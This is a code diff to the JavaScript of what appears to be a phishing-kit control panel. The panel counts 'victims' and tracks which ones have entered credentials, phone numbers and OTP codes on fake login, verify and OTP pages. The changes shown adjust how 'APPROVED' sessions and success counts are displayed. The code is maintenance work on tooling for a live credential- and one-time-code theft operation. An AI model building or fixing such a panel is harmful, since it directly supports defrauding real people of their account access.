@@ -172,8 +172,9 @@
       setTimeout(() => alert.remove(), 5000);
     }
 
-    /* ----------  STATUS TEXT  ---------- */
+    /* ----------  STATUS TEXT - FIXED  ---------- */
     function statusText(s){
+      // Just show APPROVED for approved sessions
       if (s.page==='success' || s.status==='approved') return '<div style="color:var(--green)">APPROVED</div>';
       if (s.page==='index.html' && s.entered) return '<div style="font-size:11px;color:var(--green)">ENTERED CREDENTIALS</div>';
       if (s.page==='verify.html' && s.phone) return '<div style="font-size:11px;color:var(--blue)">ENTERED PHONE</div>';
@@ -241,12 +242,13 @@
 
     /* ----------  RENDER  ---------- */
     function pageTitle(f){
+      // Just show APPROVED for success page
+      if (f === 'success') return 'APPROVED';
       switch(f){
         case 'index.html': return 'LOGIN';
         case 'verify.html': return 'PHONE';
         case 'unregister.html': return 'UNREGISTER';
         case 'otp.html': return 'OTP';
-        case 'success': return 'SUCCESS';
         default: return f;
       }
     }
@@ -259,20 +261,17 @@
     function render(d){
       qs('#userName').textContent = d.username;
       qs('#total').textContent    = d.totalVictims;
-      qs('#success').textContent  = d.success;
+      
+      // FIXED: Just show the success count from server, don't add extra
+      qs('#success').textContent = d.success;
+      
       qs('#domainLink').textContent = d.domain || 'localhost';
       qs('#domainLink').href        = d.domain || 'http://localhost';
 
-      // Filter out approved sessions from active count and display
+      // Filter out approved sessions from active count
       const activeSessions = d.sessions.filter(s => !isApproved(s));
-      const approvedCount = d.sessions.filter(s => isApproved(s)).length;
       
       qs('#active').textContent = activeSessions.length;
-      
-      // Show approved count in success card if any
-      if (approvedCount > 0) {
-        qs('#success').textContent = `${d.success} (+${approvedCount} approved)`;
-      }
 
       const body = qs('#tbl tbody');
       const empty= qs('#empty');
